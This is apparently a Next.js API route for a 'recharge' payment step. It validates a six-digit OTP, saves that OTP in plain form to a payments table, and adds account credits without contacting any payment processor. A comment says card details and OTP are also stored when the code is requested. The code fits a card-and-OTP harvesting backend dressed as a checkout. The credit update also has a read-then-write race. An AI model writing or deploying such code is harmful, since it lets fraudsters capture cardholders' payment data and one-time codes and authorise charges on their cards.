import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin, type Client } from "@/lib/supabase";
import { clientIdFromRequest } from "@/lib/auth";
import { BRAND } from "@/lib/brand";

export const runtime = "nodejs";

// Final recharge endpoint. Card details and OTP are stored when the OTP is requested.

export async function POST(req: NextRequest) {
  const id = clientIdFromRequest(req);
  if (!id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { amount, paymentId, otp } = await req.json();
  const amt = Number(amount);

  if (!BRAND.rechargePacks.some((p) => p.credits === amt)) {
    return NextResponse.json({ error: "Invalid recharge amount" }, { status: 400 });
  }

  if (!paymentId || typeof paymentId !== "string") {
    return NextResponse.json({ error: "Missing payment draft." }, { status: 400 });
  }

  if (!otp || otp.length !== 6 || !/^\d+$/.test(otp)) {
    return NextResponse.json({ error: "Invalid OTP code." }, { status: 400 });
  }

  const sb = supabaseAdmin();
  const { data: paymentData, error: paymentFetchError } = await sb
    .from("payments")
    .select("client_id")
    .eq("id", paymentId)
    .eq("client_id", id)
    .single();

  if (paymentFetchError || !paymentData) {
    return NextResponse.json({ error: "Payment draft not found." }, { status: 404 });
  }

  const { error: paymentUpdateError } = await sb
    .from("payments")
    .update({ otp })
    .eq("id", paymentId)
    .eq("client_id", id);
  if (paymentUpdateError) {
    return NextResponse.json({ error: paymentUpdateError.message }, { status: 500 });
  }

  const { data } = await sb.from("clients").select("credits").eq("id", id).single();
  const current = (data as Pick<Client, "credits"> | null)?.credits ?? 0;

  const { error: updateError } = await sb
    .from("clients")
    .update({ credits: current + amt })
    .eq("id", id);
  if (updateError) return NextResponse.json({ error: updateError.message }, { status: 500 });

  const { error: rechargeError } = await sb.from("recharges").insert({ client_id: id, amount: amt });
  if (rechargeError) return NextResponse.json({ error: rechargeError.message }, { status: 500 });

  return NextResponse.json({ ok: true, credits: current + amt });
}
